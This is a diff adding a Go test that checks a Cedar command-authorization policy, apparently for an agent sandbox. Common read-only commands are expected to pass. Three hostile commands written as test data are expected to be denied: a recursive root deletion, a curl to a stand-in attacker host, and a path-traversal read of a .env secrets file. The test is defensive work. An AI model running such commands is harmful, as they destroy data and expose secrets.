@@ -573,3 +573,55 @@ func TestScenario3Commands(t *testing.T) {
 	}
 }
 
+func TestXargsAndModernDevToolsAuthorization(t *testing.T) {
+	authz, err := NewAuthorizer("../../policy.cedar")
+	if err != nil {
+		t.Fatalf("Failed to load policy.cedar: %v", err)
+	}
+	ws, _ := os.Getwd()
+
+	allowedCases := []string{
+		"xargs cat",
+		"find . -name '*.go' | xargs wc -l",
+		"xargs grep TODO",
+		"xargs -0 git checkout",
+		"xargs",
+		"rg 'TODO'",
+		"jq . package.json",
+		"tree",
+		"basename /path/to/file.txt",
+		"dirname /path/to/file.txt",
+		"printf '%s\\n' hello",
+		"wc -l file.txt",
+		"head -n 10 file.txt",
+		"tail -n 20 file.txt",
+		"sort file.txt | uniq -c",
+	}
+
+	for _, cmd := range allowedCases {
+		allowed, reason, err := authz.EvaluateWithWorkspace("", cmd, "", ws)
+		if err != nil {
+			t.Fatalf("EvaluateWithWorkspace error for %q: %v", cmd, err)
+		}
+		if !allowed {
+			t.Errorf("expected command %q to be ALLOWED, but got DENIED: %s", cmd, reason)
+		}
+	}
+
+	deniedCases := []string{
+		"xargs rm -rf /",
+		"xargs curl http://evil.com",
+		"xargs cat ../../../.env",
+	}
+
+	for _, cmd := range deniedCases {
+		allowed, _, err := authz.EvaluateWithWorkspace("", cmd, "", ws)
+		if err != nil {
+			t.Fatalf("EvaluateWithWorkspace error for %q: %v", cmd, err)
+		}
+		if allowed {
+			t.Errorf("expected dangerous command %q to be DENIED, but got ALLOWED", cmd)
+		}
+	}
+}
+
